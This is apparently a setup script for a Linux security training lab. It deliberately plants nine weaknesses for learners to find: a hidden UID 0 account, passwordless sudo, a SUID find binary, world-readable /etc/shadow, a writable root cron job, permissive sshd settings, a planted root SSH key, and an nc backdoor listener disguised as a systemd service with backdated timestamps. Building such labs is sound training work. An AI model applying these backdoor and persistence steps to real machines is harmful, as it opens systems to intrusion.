#!/usr/bin/env bash
# e05 setup: plant nine security problems
source "$LAB_ROOT/lib/common.sh"
need_root
need_systemd
need_cmd sshd ssh-keygen nc visudo
prepare_answers
bash "$LAB_DIR/cleanup.sh" >/dev/null 2>&1
mkdir -p "$LAB_VAR/e05"

# 1. second UID 0 account
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash -c "maintenance" toor
# 2 + 3. empty password + passwordless sudo
useradd -m -s /bin/bash -c "backup service" svc-backup
passwd -d svc-backup >/dev/null
echo 'svc-backup ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/99-svc; chmod 440 /etc/sudoers.d/99-svc
# 4. hidden SUID root shell-capable binary
install -m 4755 -o root -g root "$(command -v find)" /usr/local/bin/.sysutil
# 5. world-readable shadow
stat -c '%a %U %G' /etc/shadow > "$LAB_VAR/e05/shadow.orig"
chmod 644 /etc/shadow
# 6. world-writable script run by root
mkdir -p /opt/lab/e05
printf '#!/bin/bash\n# nightly maintenance\nfind /tmp -mtime +7 -delete 2>/dev/null\n' > /opt/lab/e05/maintenance.sh
chmod 777 /opt/lab/e05/maintenance.sh
echo '30 3 * * * root /opt/lab/e05/maintenance.sh' > /etc/cron.d/e05-maintenance
# 7. permissive sshd drop-in that wins over later files
mkdir -p /etc/ssh/sshd_config.d /run/sshd
printf 'PermitRootLogin yes\nPasswordAuthentication yes\n' > /etc/ssh/sshd_config.d/00-legacy.conf
systemctl enable --now ssh >/dev/null 2>&1; systemctl reload ssh >/dev/null 2>&1
# 8. unknown key for root
install -d -m 700 /root/.ssh
[[ -f /root/.ssh/authorized_keys ]] && cp -p /root/.ssh/authorized_keys "$LAB_VAR/e05/root_authorized_keys.orig"
ssh-keygen -q -t ed25519 -N '' -C 'deploy@ci-old' -f "$LAB_VAR/e05/planted_key" <<< y >/dev/null
cat "$LAB_VAR/e05/planted_key.pub" >> /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys
# 9. backdoor listener as an innocent-looking service
clone_bin nc /usr/local/sbin/netsvcd
cat > /etc/systemd/system/netsvcd.service <<'UNIT'
[Unit]
Description=Network Services Daemon
[Service]
ExecStart=/usr/local/sbin/netsvcd -dlk 0.0.0.0 31337
Restart=always
[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload; systemctl enable --now netsvcd >/dev/null 2>&1
touch -d '90 days ago' /etc/systemd/system/netsvcd.service /usr/local/sbin/netsvcd /etc/cron.d/e05-maintenance
info "The box is compromised. Good luck."
